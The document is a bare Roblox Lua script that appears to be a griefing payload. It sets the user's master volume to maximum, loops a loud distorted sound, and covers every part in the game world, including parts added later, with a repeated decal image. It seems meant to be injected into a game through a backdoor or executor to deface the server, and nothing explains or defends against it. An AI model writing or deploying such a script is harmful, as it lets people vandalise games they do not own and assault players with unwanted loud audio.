pcall(function()
local Instance_new = Instance.new
local Enum_NormalId = Enum.NormalId
local workspace = workspace
local Instance_IsA = workspace.IsA

pcall(function()
    UserSettings():GetService("UserGameSettings").MasterVolume = 1
end)

local sound = Instance_new("Sound")
sound.SoundId = "rbxassetid://4705204677"
sound.Volume = 10
sound.Looped = true
sound.PlaybackSpeed = 1.15
sound.PlayOnRemove = true
local distortion = Instance_new("DistortionSoundEffect")
distortion.Level = 1
distortion.Priority = 1
distortion.Parent = sound
sound.Parent = workspace
sound:Play()

local FACES = {
    Enum_NormalId.Top,
    Enum_NormalId.Bottom,
    Enum_NormalId.Back,
    Enum_NormalId.Front,
    Enum_NormalId.Right,
    Enum_NormalId.Left
}

local function spamPart(object)
    if Instance_IsA(object, "BasePart") then
        for index = 1, 6 do
            local decal = Instance_new("Decal")
            decal.Texture = "http://www.roblox.com/asset/?id=87686621"
            decal.Face = FACES[index]
            decal.Parent = object
        end
    end
end

local workspaceDescendants = workspace:GetDescendants()
for index = 1, #workspaceDescendants do
    spamPart(workspaceDescendants[index])
end
workspace.DescendantAdded:Connect(spamPart)
end)
